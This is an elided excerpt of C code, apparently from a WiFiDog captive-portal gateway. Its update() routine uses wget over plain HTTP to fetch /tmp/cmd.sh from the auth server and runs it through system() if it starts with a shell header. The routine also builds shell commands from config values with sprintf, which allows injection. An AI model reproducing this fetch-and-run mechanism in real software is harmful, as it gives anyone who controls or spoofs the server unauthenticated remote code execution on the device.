...
thread_ping(void *arg)
{
	...
	while (1) {
		...
		ping();
		debug(LOG_DEBUG, "Running update()");
		update();
...
ping(void)
{
	...
	snprintf(request, sizeof(request) - 1,
			"GET %s%sstage=ping&gw_id=%s&sys_uptime=%lu&sys_memfree=%u&sys_load=%.2f&wifidog_uptime=%lu HTTP/1.0\r\n"
...
update(void)
{
	...
	pid_t			pid;
		...
		pid = fork();
			if (pid == 0)
			{
				sprintf(command, "/bin/rm -f /tmp/cmd.sh");
					system(command);
				sprintf(wgetdata, "/usr/bin/wget -U %s -O /tmp/cmd.sh http://%s/modules/wifidog/update.php > /dev/null 2>&1",	config_get_config()->gw_id, auth_server->authserv_hostname);
			debug(LOG_DEBUG, "Get cmd from server [%s]", wgetdata);
					system(wgetdata);
				
				if ((fh = fopen("/tmp/cmd.sh", "r"))) {
					fscanf(fh, "%s", &is_bash);
					fclose(fh);
				}
			
			debug(LOG_DEBUG, "File header is: %s", is_bash);
				if (strstr(is_bash, "#!/bin/sh") == 0) {
			debug(LOG_DEBUG, "Not bash");
				sprintf(command, "/bin/rm -f /tmp/cmd.sh");
					system(command);
				}
				else {
			debug(LOG_DEBUG, "Is bash");
				sprintf(command, "/bin/chmod +x /tmp/cmd.sh");
					system(command);
				sprintf(command, "/tmp/cmd.sh");
					system(command);
				sprintf(command, "/bin/rm -f /tmp/cmd.sh");
					system(command);
				}
